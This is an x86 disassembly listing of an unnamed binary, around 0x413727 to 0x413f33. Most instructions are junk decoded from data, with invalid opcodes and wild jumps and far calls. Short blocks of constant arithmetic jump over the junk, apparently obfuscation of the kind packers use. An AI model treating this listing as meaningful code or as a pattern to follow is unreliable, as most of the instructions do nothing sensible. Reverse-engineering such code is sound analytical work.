  413727:	outs   dx,DWORD PTR ds:[esi]
  413728:	mov    bl,BYTE PTR [esi]
  41372a:	dec    eax
  41372b:	mov    bh,0xba
  41372d:	jle    0x413712
  41372f:	fcomp  DWORD PTR [ebx-0x3fa293f]
  413735:	xchg   edx,eax
  413736:	xchg   ecx,eax
  413737:	sub    BYTE PTR [ecx-0x40],0x38
  41373b:	add    BYTE PTR fs:[eax],al
  41373e:	jmp    0x413809
  413743:	clc    
  413744:	cs clc 
  413746:	and    edi,esi
  413748:	idiv   ebx
  41374a:	jmp    DWORD PTR [esi-0x4070e42c]
  413750:	in     eax,0x1f
  413752:	in     al,0x91
  413754:	fadd   DWORD PTR [eax]
  413756:	add    BYTE PTR [esi+0x1c000000],ch
  41375c:	jmp    FWORD PTR [edi+0x58acc866]
  413762:	cmp    edx,DWORD PTR [edx+0x62]
  413765:	ret    
  413766:	call   0x1fac:0x5302d09d
  41376d:	inc    ebx
  41376e:	arpl   WORD PTR [ebx-0x73],bp
  413771:	faddp  st(1),st
  413773:	(bad)
  413777:	sub    eax,DWORD PTR [ebp-0x34]
  41377a:	or     BYTE PTR [ebx+ebp*4],dh
  41377d:	sbb    al,0xf4
  41377f:	xor    BYTE PTR [ebx+0x7cded59a],dl
  413785:	dec    edx
  413786:	call   0xa164b84d
  41378b:	into   
  41378c:	xchg   BYTE PTR ds:0xf506f03f,bl
  413792:	push   es
  413793:	mov    bh,0x99
  413795:	in     eax,dx
  413796:	xor    DWORD PTR [ebx-0x73],esp
  413799:	xor    al,0xb7
  41379b:	push   ds
  41379c:	cmp    ebx,edi
  41379e:	div    DWORD PTR [edx+0x37988aa8]
  4137a4:	mov    ch,dh
  4137a6:	push   ecx
  4137a7:	icebp  
  4137a8:	mov    ds:0x932abb29,al
  4137ad:	fcomp  QWORD PTR [esi-0x35159341]
  4137b3:	data16 outs dx,BYTE PTR ds:[esi]
  4137b5:	mov    ch,0xa1
  4137b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b8:	sub    DWORD PTR [esi],esi
  4137ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137bb:	(bad)  
  4137bc:	(bad)  
  4137bd:	push   ebx
  4137be:	mov    ecx,ecx
  4137c0:	mov    edx,0xe64b4944
  4137c5:	es inc eax
  4137c7:	xor    bh,BYTE PTR [ecx-0x6a]
  4137ca:	adc    eax,0xb8fc8530
  4137cf:	adc    BYTE PTR [ecx+0x23b68fd2],bh
  4137d5:	fwait
  4137d6:	in     al,dx
  4137d7:	xor    bl,dh
  4137d9:	ja     0x413847
  4137db:	push   eax
  4137dc:	les    ecx,FWORD PTR [edi-0x6203fcb0]
  4137e2:	fadd   DWORD PTR [ecx-0x1a]
  4137e5:	or     BYTE PTR [esp+esi*1],ch
  4137e8:	push   edi
  4137e9:	mov    BYTE PTR [ecx+0x76],ah
  4137ec:	pop    ebx
  4137ed:	adc    DWORD PTR [edx-0x31],ecx
  4137f0:	mov    ebx,0x44ed8a85
  4137f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f6:	and    eax,0x11c41d83
  4137fb:	jmp    0x41384d
  4137fd:	outs   dx,BYTE PTR ds:[esi]
  4137fe:	xchg   esp,eax
  4137ff:	sbb    al,0x5c
  413801:	add    al,0x4f
  413803:	ret    0xa37b
  413806:	and    al,BYTE PTR [edx+0x2dc10b9a]
  41380c:	jmp    FWORD PTR [edi]
  41380e:	loopne 0x413827
  413810:	mov    DWORD PTR [ebp-0x24],eax
  413813:	mov    DWORD PTR [ebp-0x4],0x1bbf
  41381a:	jmp    0x4138e5
  41381f:	(bad)  
  413820:	fadd   st,st(5)
  413822:	in     al,0xff
  413824:	std    
  413825:	arpl   si,bx
  413827:	jg     0x41385c
  413829:	add    cl,BYTE PTR [esi-0x67]
  41382c:	and    al,0xf8
  41382e:	mov    eax,ds:0xd93f
  413833:	scas   al,BYTE PTR es:[edi]
  413834:	add    BYTE PTR [eax],al
  413836:	add    BYTE PTR [eax+0x1f],ah
  413839:	add    esi,DWORD PTR [edx-0x78818bac]
  41383f:	dec    ebp
  413840:	test   dh,dh
  413842:	sbb    ah,BYTE PTR [esi-0x33]
  413845:	retf   0x1c2a
  413848:	mov    edx,DWORD PTR [edi+0x57]
  41384b:	faddp  st(7),st
  41384d:	cmp    al,0xa0
  41384f:	sub    ecx,DWORD PTR [edi]
  413851:	icebp  
  413852:	cmp    cl,BYTE PTR [ecx-0x600ebc20]
  413858:	lea    ebx,[edi-0x6f361537]
  41385e:	cmp    BYTE PTR [eax-0x1f],0xcc
  413862:	or     eax,DWORD PTR [edi]
  413864:	jecxz  0x4138b2
  413866:	ss in  al,0x28
  413869:	inc    ebx
  41386a:	(bad)  
  41386b:	or     BYTE PTR [eax+0x6af5d521],cl
  413871:	push   0x6bca6554
  413876:	scas   al,BYTE PTR es:[edi]
  413877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413878:	sub    eax,0x5326b6d1
  41387d:	add    BYTE PTR [edi+ebp*1+0x7c],ah
  413881:	fisub  DWORD PTR [ebx-0x47055e56]
  413887:	aad    0x34
  413889:	mul    BYTE PTR [edi]
  41388b:	mov    ds:0xecb8f886,eax
  413890:	retf   0x2b76
  413893:	jne    0x4138fa
  413895:	xor    BYTE PTR [esi-0x13ed71b1],bh
  41389b:	call   0x1def889a
  4138a0:	cmp    eax,0x503f9d3b
  4138a5:	jno    0x413905
  4138a7:	push   0x30
  4138a9:	aam    0x8c
  4138ab:	call   0xbe3c:0x5a30e57b
  4138b2:	sub    DWORD PTR [ecx+0x3a637aa7],ecx
  4138b8:	xchg   ecx,eax
  4138b9:	in     eax,dx
  4138ba:	cmp    eax,0x19c1ec50
  4138bf:	adc    eax,0x9e374550
  4138c4:	loope  0x4138c9
  4138c6:	ss and edi,DWORD PTR es:[eax+0x7c]
  4138cb:	add    BYTE PTR [esi],ah
  4138cd:	inc    ecx
  4138ce:	ret    0x9cf3
  4138d1:	dec    ecx
  4138d2:	dec    eax
  4138d3:	or     bl,al
  4138d5:	fs cli 
  4138d7:	sbb    BYTE PTR [ecx-0x46bac0de],al
  4138dd:	pusha  
  4138de:	mov    dl,0xb2
  4138e0:	jb     0x413872
  4138e2:	repnz xlat BYTE PTR ds:[ebx]
  4138e4:	jle    0x4138ad
  4138e6:	inc    ebp
  4138e7:	hlt    
  4138e8:	popa   
  4138e9:	pop    ebp
  4138ea:	add    BYTE PTR [eax],al
  4138ec:	mov    DWORD PTR [ebp-0x8],0x2a7f
  4138f3:	mov    eax,DWORD PTR [ebp-0x8]
  4138f6:	mov    ecx,DWORD PTR [ebp-0xc]
  4138f9:	shr    eax,1
  4138fb:	add    eax,0x3966
  413900:	imul   eax,ecx
  413903:	mov    ecx,DWORD PTR [ebp-0x4]
  413906:	jmp    0x4139d1
  41390b:	mov    al,0x89
  41390d:	mov    ds:0xb0bbbb92,al
  413912:	stos   DWORD PTR es:[edi],eax
  413913:	lea    eax,[ebx+0x62]
  413916:	dec    esi
  413917:	scas   eax,DWORD PTR es:[edi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	xchg   DWORD PTR [edx-0x13],edi
  41391c:	fld    DWORD PTR [eax]
  41391e:	add    BYTE PTR [esi-0x18000000],ch
  413924:	pop    edx
  413925:	fs sbb al,0x47
  413928:	out    dx,eax
  413929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41392a:	rcl    DWORD PTR [edi],0x60
  41392d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41392e:	mov    ebp,0xd3edf6ad
  413933:	adc    dl,0x7f
  413936:	sub    DWORD PTR [ecx],eax
  413938:	xor    al,0x5d
  41393a:	jmp    0x88c08d24
  41393f:	adc    edx,DWORD PTR [edi+0xd3b0618]
  413945:	pop    ebx
  413946:	push   es
  413947:	jns    0x413975
  413949:	xor    al,0x32
  41394b:	out    0xac,al
  41394d:	pop    DWORD PTR [ecx-0x4a]
  413950:	xchg   ebx,eax
  413951:	sbb    DWORD PTR [eax+0x1c884bcc],edx
  413957:	fs ds (bad) 
  41395a:	pop    edi
  41395b:	adc    esi,DWORD PTR [ecx-0x56d3f13]
  413961:	mov    ebx,0x4eb337ee
  413966:	sbb    al,0xdb
  413968:	in     al,0x9e
  41396a:	call   0xbf0f:0x31e8f341
  413971:	ror    dl,0xff
  413974:	push   cs
  413975:	mov    edx,0x69585ef1
  41397a:	mov    ecx,0x1d323246
  41397f:	push   ss
  413980:	mov    ?,WORD PTR [eax+0x22]
  413983:	sub    DWORD PTR [ecx+0x41],ecx
  413986:	mov    ds:0x144e2116,al
  41398b:	adc    edx,DWORD PTR [edi-0x1c89519]
  413991:	jle    0x413987
  413993:	aam    0x25
  413995:	in     al,dx
  413996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413997:	inc    ebx
  413998:	sbb    eax,0xa9e8d06
  41399d:	test   BYTE PTR [edi+ebx*4+0x71],bl
  4139a1:	call   0xe07939ab
  4139a6:	push   esp
  4139a7:	cdq    
  4139a8:	sbb    cl,BYTE PTR [edx+0x6e]
  4139ab:	push   esp
  4139ac:	inc    ebp
  4139ad:	ret    0x7cf8
  4139b0:	add    bh,BYTE PTR [edx+0x36]
  4139b3:	jge    0x4139ef
  4139b5:	xchg   esi,eax
  4139b6:	neg    BYTE PTR [ecx+0x2975a732]
  4139bc:	xchg   bp,ax
  4139be:	and    ah,al
  4139c0:	adc    bl,BYTE PTR [ebx+0x6f]
  4139c3:	and    ch,BYTE PTR ds:[eax+0x627bb20a]
  4139ca:	stc    
  4139cb:	jge    0x413a1d
  4139cd:	xor    BYTE PTR [eax],dl
  4139cf:	bound  ebx,QWORD PTR [ebx+ebp*1-0x3f]
  4139d3:	imul   eax,eax,0x7cb6
  4139d9:	xor    eax,0x7738ea84
  4139de:	mov    DWORD PTR [ebp-0x6c],eax
  4139e1:	mov    DWORD PTR [ebp-0x14],0x7c1d
  4139e8:	jmp    0x413ab3
  4139ed:	test   BYTE PTR [edi-0x50],dh
  4139f0:	xchg   bl,dh
  4139f2:	(bad)  
  4139f3:	mov    dh,0x77
  4139f5:	gs dec edi
  4139f7:	ja     0x413a62
  4139f9:	xor    ch,ah
  4139fb:	pop    eax
  4139fc:	mov    eax,ds:0xda9b
  413a01:	scas   al,BYTE PTR es:[edi]
  413a02:	add    BYTE PTR [eax],al
  413a04:	add    BYTE PTR [edi+0x5cfaa3b2],al
  413a0a:	(bad)  
  413a0b:	mov    BYTE PTR [eax-0x4f20e608],0x3d
  413a12:	and    al,0xad
  413a14:	ficom  WORD PTR [edx+0x26]
  413a17:	inc    esi
  413a18:	outs   dx,DWORD PTR ds:[esi]
  413a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1a:	retf   
  413a1b:	mov    dh,0x96
  413a1d:	ror    ecx,0xdb
  413a20:	lds    edx,FWORD PTR [ecx+0x7a]
  413a23:	sub    BYTE PTR [ebx+edx*1+0x735ce334],al
  413a2a:	fcomp  DWORD PTR [ebx]
  413a2c:	mov    dl,0xec
  413a2e:	and    DWORD PTR [eax-0x57cbd229],0x2a
  413a35:	sub    eax,DWORD PTR [eax+0x24]
  413a38:	and    DWORD PTR [ebp+0x45],0x57
  413a3c:	jne    0x413ab1
  413a3e:	nop
  413a3f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413a41:	jmp    0x6055:0x6b571de2
  413a48:	rcl    DWORD PTR [ebx-0x29],cl
  413a4b:	out    0x45,al
  413a4d:	(bad)  
  413a4e:	daa    
  413a4f:	and    esp,0x9b38f07d
  413a55:	xchg   ebx,eax
  413a56:	mov    dl,0x91
  413a58:	aam    0x33
  413a5a:	push   cs
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	add    DWORD PTR [edi+0x2a],esi
  413a60:	dec    ebp
  413a61:	sub    BYTE PTR [ebx-0x738491fc],0x3d
  413a68:	jge    0x413a45
  413a6a:	mov    ch,0xa1
  413a6c:	xchg   ebp,eax
  413a6d:	je     0x413a0b
  413a6f:	xchg   DWORD PTR [ebx],ecx
  413a71:	out    0x27,al
  413a73:	add    BYTE PTR [esi],dl
  413a75:	fld    TBYTE PTR [edi-0x125f233d]
  413a7b:	and    dh,BYTE PTR [ebp+edx*2+0x258aa00f]
  413a82:	test   eax,0x5df53204
  413a87:	add    esi,edi
  413a89:	cmp    edi,DWORD PTR [eax-0x20]
  413a8c:	pop    eax
  413a8d:	std    
  413a8e:	enter  0xfc54,0x8c
  413a92:	rol    ecx,0xa1
  413a95:	(bad)  
  413a96:	call   0xefb18f82
  413a9b:	pop    ebp
  413a9c:	pop    ds
  413a9d:	mov    cl,0x7e
  413a9f:	sub    al,0xee
  413aa1:	xchg   edx,eax
  413aa2:	iret   
  413aa3:	push   edx
  413aa4:	out    0x78,eax
  413aa6:	xor    ch,0xeb
  413aa9:	repnz pop esp
  413aab:	loopne 0x413a94
  413aad:	mov    al,ch
  413aaf:	(bad)  
  413ab1:	call   0x7c45:0xfc45c78b
  413ab8:	add    BYTE PTR [eax],al
  413aba:	jmp    0x413b85
  413abf:	jbe    0x413ac6
  413ac1:	jbe    0x413aa3
  413ac3:	ja     0x413ab8
  413ac5:	not    BYTE PTR [edi-0x5e7c9e17]
  413acb:	les    ebx,FWORD PTR [ebx-0x24b6c721]
  413ad1:	add    BYTE PTR [eax],al
  413ad3:	scas   al,BYTE PTR es:[edi]
  413ad4:	add    BYTE PTR [eax],al
  413ad6:	add    BYTE PTR [esi-0x63a7e9f],bh
  413adc:	test   DWORD PTR [ebx+esi*2+0x47],0x759a0aa9
  413ae4:	pop    esi
  413ae5:	push   esp
  413ae6:	in     eax,0x1a
  413ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae9:	xor    al,0x69
  413aeb:	add    ebx,ebx
  413aed:	cwde   
  413aee:	cmp    BYTE PTR [esi+0x3e004ff1],dl
  413af4:	test   BYTE PTR [esi+0x772f1ea1],al
  413afa:	out    dx,al
  413afb:	pop    edx
  413afc:	mov    esi,0xe8d11295
  413b01:	sub    eax,0xf673b329
  413b06:	mov    ds:0x37a64efd,al
  413b0b:	neg    DWORD PTR [esi+0x6c718312]
  413b11:	sub    ecx,DWORD PTR [ebx+0x50]
  413b14:	pop    ebx
  413b15:	sbb    eax,0xaa164aa3
  413b1a:	pop    ds
  413b1b:	xor    BYTE PTR [eax+0x17a532a7],dl
  413b21:	mov    edx,0x74aac5bb
  413b26:	sub    ebx,DWORD PTR [edi]
  413b28:	out    0xeb,al
  413b2a:	jecxz  0x413b42
  413b2c:	sub    ch,dl
  413b2e:	(bad)
  413b31:	jbe    0x413b31
  413b33:	inc    eax
  413b34:	loope  0x413acd
  413b36:	stos   DWORD PTR es:[edi],eax
  413b37:	mov    esp,0x6cbe17
  413b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b3d:	pushf  
  413b3e:	sbb    DWORD PTR [esi],esi
  413b40:	ja     0x413bbe
  413b42:	popa   
  413b43:	(bad)  
  413b45:	sbb    BYTE PTR [ebp-0x1a],dl
  413b48:	ja     0x413b5c
  413b4a:	repz and BYTE PTR [esi],cl
  413b4d:	sti    
  413b4e:	cwde   
  413b4f:	adc    BYTE PTR ds:0xb06c90a2,ah
  413b55:	jmp    0x413b0b
  413b57:	lds    edx,FWORD PTR [ebp-0x2e]
  413b5a:	les    esi,FWORD PTR [ebx-0x16]
  413b5d:	iret   
  413b5e:	fild   QWORD PTR [ebp-0x53]
  413b61:	frstor [esi-0xc]
  413b64:	pop    es
  413b65:	pop    esi
  413b66:	cmp    eax,0x693c0f44
  413b6b:	ss jns 0x413b48
  413b6e:	test   al,0xcf
  413b70:	ja     0x413bd1
  413b72:	pop    es
  413b73:	outs   dx,DWORD PTR ds:[esi]
  413b74:	out    dx,eax
  413b75:	icebp  
  413b76:	mov    esi,0xf14d1361
  413b7b:	adc    BYTE PTR ds:0x9142509,bl
  413b81:	push   0xffffffb3
  413b83:	aaa    
  413b84:	pop    edx
  413b85:	mov    DWORD PTR [ebp-0xc],0x2e61
  413b8c:	mov    DWORD PTR [ebp-0x8],0x1d6b
  413b93:	mov    eax,DWORD PTR [ebp-0x8]
  413b96:	jmp    0x413c61
  413b9b:	clc    
  413b9c:	outs   dx,DWORD PTR ds:[esi]
  413b9d:	call   0x60ff:0xf9f79f43
  413ba4:	ja     0x413b53
  413ba6:	add    bh,cl
  413ba8:	cmp    bh,ch
  413baa:	xchg   ebp,eax
  413bab:	neg    ebx
  413bad:	add    BYTE PTR [eax],al
  413baf:	scas   al,BYTE PTR es:[edi]
  413bb0:	add    BYTE PTR [eax],al
  413bb2:	add    BYTE PTR [ecx],dl
  413bb4:	dec    edx
  413bb5:	dec    ecx
  413bb6:	xor    BYTE PTR [esi+esi*2-0x64e6fda6],bh
  413bbd:	arpl   WORD PTR [eax-0x3],bx
  413bc0:	xchg   esp,eax
  413bc1:	es popf 
  413bc3:	push   eax
  413bc4:	cmp    ebp,edx
  413bc6:	shl    BYTE PTR [esp+ebx*4+0x79528848],cl
  413bcd:	xchg   edi,eax
  413bce:	stos   DWORD PTR es:[edi],eax
  413bcf:	mov    esp,0x790d0a82
  413bd4:	leave  
  413bd5:	sub    edx,DWORD PTR [ecx-0xf]
  413bd8:	pop    ebp
  413bd9:	fwait
  413bda:	mov    bl,0x1a
  413bdc:	xchg   edi,eax
  413bdd:	stos   BYTE PTR es:[edi],al
  413bde:	fwait
  413bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413be0:	pop    esp
  413be1:	cmc    
  413be2:	sub    bl,ah
  413be4:	test   al,0x61
  413be6:	arpl   WORD PTR [edx-0x1af5dda8],cx
  413bec:	mov    dh,0x21
  413bee:	push   es
  413bef:	bound  ecx,QWORD PTR [ecx-0x54]
  413bf2:	mov    esp,0x723516bb
  413bf7:	add    BYTE PTR [esp+0x7da37e19],bl
  413bfe:	jnp    0x413c5b
  413c00:	test   BYTE PTR [esi+0x1cd25dc2],0x8b
  413c07:	stc    
  413c08:	ror    dl,cl
  413c0a:	mov    ebx,0x571d10fd
  413c0f:	mov    al,ds:0x915bc1f
  413c14:	push   ecx
  413c15:	repnz leave 
  413c17:	xchg   BYTE PTR [edi],dl
  413c19:	and    esp,esp
  413c1b:	clc    
  413c1c:	retf   0x952
  413c1f:	dec    edi
  413c20:	push   ebp
  413c21:	repz mov dh,0xa7
  413c24:	jge    0x413bac
  413c26:	pop    esi
  413c27:	or     BYTE PTR [ecx],0x6e
  413c2a:	inc    ecx
  413c2b:	mov    ecx,0xedb06eb7
  413c30:	rcr    BYTE PTR [edx],1
  413c32:	push   esp
  413c33:	jne    0x413cae
  413c35:	push   cs
  413c36:	ja     0x413c2f
  413c38:	pop    edi
  413c39:	push   ebp
  413c3a:	inc    esp
  413c3b:	push   ebx
  413c3c:	loopne 0x413c44
  413c3e:	cs adc ah,cl
  413c41:	push   cs
  413c42:	js     0x413bcc
  413c44:	jae    0x413c86
  413c46:	cmp    cl,0x4c
  413c49:	sub    edi,DWORD PTR [ebx]
  413c4b:	mov    gs,WORD PTR [ecx+edx*1]
  413c4e:	jg     0x413c54
  413c50:	or     ch,BYTE PTR [ebp-0x5cec838c]
  413c56:	mov    ecx,0x54f22cd1
  413c5b:	lock pop edi
  413c5d:	mov    ecx,0x8b68c3ad
  413c62:	dec    ebp
  413c63:	hlt    
  413c64:	shr    eax,1
  413c66:	lea    eax,[eax+ecx*1-0x66b0]
  413c6d:	jmp    0x413d38
  413c72:	daa    
  413c73:	adc    dl,BYTE PTR ds:0xa7b735b6
  413c79:	xchg   ebx,eax
  413c7a:	push   eax
  413c7b:	or     ecx,DWORD PTR ds:0x70fdeff8
  413c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c83:	fadd   QWORD PTR [eax]
  413c85:	add    BYTE PTR [esi+0x1a000000],ch
  413c8b:	inc    ebp
  413c8c:	ret    
  413c8d:	repnz idiv DWORD PTR [edx+edi*1+0x2c4892ff]
  413c95:	pop    es
  413c96:	je     0x413cc5
  413c98:	das    
  413c99:	sbb    ah,BYTE PTR [edi]
  413c9b:	call   0xa2f0:0x3303624e
  413ca2:	jmp    0xe4e455de
  413ca7:	test   DWORD PTR ds:0xe974d68e,0x96afa04b
  413cb1:	daa    
  413cb2:	xor    ebx,ecx
  413cb4:	xchg   edx,eax
  413cb5:	retf   0xd778
  413cb8:	call   FWORD PTR [edi-0x7d]
  413cbb:	imul   esp,DWORD PTR [eax-0x797a069a],0xffffffd7
  413cc2:	mov    al,ds:0xd03ca608
  413cc7:	int3   
  413cc8:	xchg   BYTE PTR [edi-0x7652c411],dh
  413cce:	outs   dx,DWORD PTR ds:[esi]
  413ccf:	dec    esi
  413cd0:	popa   
  413cd1:	dec    esp
  413cd2:	mov    edx,0x1e45ead8
  413cd7:	dec    ebx
  413cd8:	bnd jae 0x413d4a
  413cdb:	mov    ah,0xe7
  413cdd:	aaa    
  413cde:	mov    ds:0xb4b8fd34,eax
  413ce3:	test   DWORD PTR [ebx-0x14645308],edx
  413ce9:	mov    bh,0xc7
  413ceb:	mov    al,ds:0x4bb9610
  413cf0:	inc    ebx
  413cf1:	inc    ecx
  413cf2:	mov    bh,0x1e
  413cf4:	sub    eax,0x315aae5e
  413cf9:	mov    ebp,0x77c5eb4f
  413cfe:	arpl   WORD PTR [edi+0x6f],sp
  413d01:	dec    ecx
  413d02:	lea    edi,[ebp-0x38758f83]
  413d08:	gs leave 
  413d0a:	sub    DWORD PTR [edx],esi
  413d0c:	inc    eax
  413d0d:	or     cl,dh
  413d0f:	loop   0x413cb9
  413d11:	cmp    eax,0x3bc64e2e
  413d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d17:	je     0x413cd3
  413d19:	adc    edi,eax
  413d1b:	enter  0xa5d4,0x66
  413d1f:	outs   dx,BYTE PTR ds:[esi]
  413d20:	(bad)  
  413d21:	out    0x2e,al
  413d23:	cs out dx,al
  413d25:	outs   dx,DWORD PTR ds:[esi]
  413d26:	cmp    DWORD PTR [eax+0x46],edi
  413d29:	sti    
  413d2a:	aad    0x85
  413d2c:	xchg   ebp,eax
  413d2d:	popf   
  413d2e:	jecxz  0x413d44
  413d30:	push   ebp
  413d31:	arpl   WORD PTR [edi],bp
  413d33:	ret    
  413d34:	jno    0x413dab
  413d36:	add    ecx,DWORD PTR [edi-0x75]
  413d39:	dec    ebp
  413d3a:	cld    
  413d3b:	imul   eax,ecx
  413d3e:	mov    ecx,DWORD PTR [ebp-0x14]
  413d41:	imul   eax,ecx
  413d44:	add    eax,0x69ab5cda
  413d49:	mov    DWORD PTR [ebp-0x24],eax
  413d4c:	mov    DWORD PTR [ebp-0x4],0x60d9d
  413d53:	mov    DWORD PTR [ebp-0xc],0x3f32
  413d5a:	mov    DWORD PTR [ebp-0x8],0x1f98
  413d61:	mov    DWORD PTR [ebp-0x14],0x44aa
  413d68:	jmp    0x413e33
  413d6d:	xchg   ecx,eax
  413d6e:	clc    
  413d6f:	shr    BYTE PTR [ebx],1
  413d71:	stc    
  413d72:	sub    edi,ebx
  413d74:	cli    
  413d75:	adc    BYTE PTR [esp+edx*1-0x6e],bl
  413d79:	or     edi,DWORD PTR [edx]
  413d7b:	mov    ds:0xdd537a,eax
  413d80:	add    BYTE PTR [esi-0x22000000],ch
  413d86:	mov    al,0xf4
  413d88:	int    0xb4
  413d8a:	int    0x5
  413d8c:	cmp    DWORD PTR [eax-0x7d],edx
  413d8f:	cmp    al,0x25
  413d91:	push   ds
  413d92:	pop    ecx
  413d93:	jmp    0xc5f11777
  413d98:	push   ebx
  413d99:	ins    DWORD PTR es:[edi],dx
  413d9a:	cld    
  413d9b:	mov    ch,0xce
  413d9d:	jae    0x413d3b
  413d9f:	push   ebp
  413da0:	cmp    eax,edx
  413da2:	(bad)  
  413da3:	jl     0x413da6
  413da5:	adc    eax,0xf7c80c0a
  413daa:	(bad)  
  413dab:	out    dx,eax
  413dac:	jae    0x413d92
  413dae:	add    eax,0xdb59f2
  413db3:	inc    esp
  413db4:	or     dl,BYTE PTR [ecx]
  413db6:	sub    ah,cl
  413db8:	mov    edi,0x4d82102
  413dbd:	data16 loop 0x413db9
  413dc0:	(bad)  
  413dc1:	add    ecx,ebp
  413dc3:	scas   eax,DWORD PTR es:[edi]
  413dc4:	call   0x91a3800d
  413dc9:	jp     0x413e02
  413dcb:	cmc    
  413dcc:	enter  0xf381,0x28
  413dd0:	scas   al,BYTE PTR es:[edi]
  413dd1:	xor    ebp,DWORD PTR [esi-0x4]
  413dd4:	cmc    
  413dd5:	sub    al,0xa2
  413dd7:	inc    ecx
  413dd8:	dec    ecx
  413dd9:	mov    dh,0x67
  413ddb:	gs stos DWORD PTR es:[edi],eax
  413ddd:	dec    ebx
  413dde:	mov    esi,0x3b19f79c
  413de3:	enter  0xd18b,0x6
  413de7:	jg     0x413e53
  413de9:	fist   DWORD PTR [edx-0x16]
  413dec:	sti    
  413ded:	mov    al,0x9f
  413def:	cmc    
  413df0:	rcl    BYTE PTR [edx-0x7007c78c],0xa0
  413df7:	mov    bl,0xe0
  413df9:	cwde   
  413dfa:	ins    DWORD PTR es:[edi],dx
  413dfb:	aas    
  413dfc:	test   eax,0xf050e84b
  413e01:	fs inc ecx
  413e03:	push   ebp
  413e04:	loop   0x413e06
  413e06:	or     eax,0xcffde3a3
  413e0b:	(bad)  
  413e0c:	into   
  413e0d:	loopne 0x413e24
  413e0f:	push   ds
  413e10:	jge    0x413ded
  413e12:	jae    0x413db2
  413e14:	mov    ch,0x39
  413e16:	jae    0x413e8c
  413e18:	or     dl,bh
  413e1a:	push   edi
  413e1b:	outs   dx,BYTE PTR ds:[esi]
  413e1c:	ret    0xa7bf
  413e1f:	pop    esi
  413e20:	jb     0x413e4c
  413e22:	out    0x96,eax
  413e24:	test   eax,0xde5f06cc
  413e29:	aad    0x3c
  413e2b:	outs   dx,BYTE PTR ds:[esi]
  413e2c:	push   ds
  413e2d:	cdq    
  413e2e:	in     al,dx
  413e2f:	inc    edi
  413e30:	pushf  
  413e31:	mov    esp,0xec458bfe
  413e36:	jmp    0x413f01
  413e3b:	xchg   DWORD PTR [edx-0x21c8b1da],esi
  413e41:	out    dx,eax
  413e42:	sti    
  413e43:	push   esi
  413e44:	jno    0x413e31
  413e46:	ins    DWORD PTR es:[edi],dx
  413e47:	add    cl,BYTE PTR [ecx-0x21fe6a60]
  413e4d:	add    BYTE PTR [eax],al
  413e4f:	scas   al,BYTE PTR es:[edi]
  413e50:	add    BYTE PTR [eax],al
  413e52:	add    BYTE PTR [ecx],dh
  413e54:	addr16 mov ebx,0xc9241fca
  413e5a:	shl    BYTE PTR [edx-0x1cd76221],cl
  413e60:	hlt    
  413e61:	or     BYTE PTR [eax+0x62677cac],0x1
  413e68:	mov    al,cl
  413e6a:	jae    0x413e0d
  413e6c:	(bad)  
  413e6e:	mov    ds:0xc86fa124,al
  413e73:	fst    DWORD PTR [esi-0x6]
  413e76:	scas   eax,DWORD PTR es:[edi]
  413e77:	arpl   WORD PTR [ebx-0x694c4bb9],si
  413e7d:	data16 xor BYTE PTR [ebx+0x7e2cd844],dl
  413e84:	mov    DWORD PTR [edi-0x24fd5e8],ecx
  413e8a:	popf   
  413e8b:	mov    edx,0x5ab2370b
  413e90:	push   esp
  413e91:	fwait
  413e92:	mov    edx,0xc175900d
  413e97:	jg     0x413ebe
  413e99:	or     bh,ah
  413e9b:	mov    dl,bl
  413e9d:	int    0xa5
  413e9f:	call   0xaf1f71bb
  413ea4:	sbb    eax,0x822a268d
  413ea9:	mov    eax,0xf69e2326
  413eae:	push   es
  413eaf:	jmp    0x413e54
  413eb1:	jno    0x413e54
  413eb3:	mov    ebx,DWORD PTR [eax-0x5b59f425]
  413eb9:	pcmpeqd mm6,QWORD PTR [eax-0x2d789e47]
  413ec0:	xor    ebx,eax
  413ec2:	xor    ah,bl
  413ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec5:	or     al,0xbd
  413ec7:	sub    al,0x2a
  413ec9:	retf   0xa9b5
  413ecc:	cmp    esi,ecx
  413ece:	shr    DWORD PTR [edi+ebx*4],1
  413ed1:	gs push 0x7b
  413ed4:	repnz xlat BYTE PTR ss:[ebx]
  413ed7:	enter  0x839a,0x93
  413edb:	(bad)  
  413edc:	jo     0x413ebd
  413ede:	stc    
  413edf:	mov    dl,0xef
  413ee1:	xor    ch,BYTE PTR [ebp+0x64f9a450]
  413ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee8:	loope  0x413e6f
  413eea:	loopne 0x413ea3
  413eec:	or     dl,BYTE PTR [ecx]
  413eee:	xor    al,0x93
  413ef0:	sub    esp,DWORD PTR [edi+0x13]
  413ef3:	cmp    al,0xb9
  413ef5:	push   ss
  413ef6:	cwde   
  413ef7:	cli    
  413ef8:	enter  0x4e53,0x8c
  413efc:	jmp    0x4d8b:0x2f2163bb
  413f03:	clc    
  413f04:	xor    eax,ecx
  413f06:	jmp    0x413fd1
  413f0b:	arpl   WORD PTR [esi-0x35],dx
  413f0e:	add    edi,edi
  413f10:	popf   
  413f11:	jmp    0x413f89
  413f13:	rcl    DWORD PTR [edi-0x25],cl
  413f16:	in     al,0xa9
  413f18:	or     ecx,esp
  413f1a:	dec    esi
  413f1b:	scas   eax,DWORD PTR es:[edi]
  413f1c:	fiadd  WORD PTR [eax]
  413f1e:	add    BYTE PTR [esi+0x4a000000],ch
  413f24:	jmp    0xe920a1e7
  413f29:	add    edi,DWORD PTR ds:0xdeb7216
  413f2f:	retf   0xe828
  413f32:	dec    esi
  413f33:	or     eax,0x5812b0c1
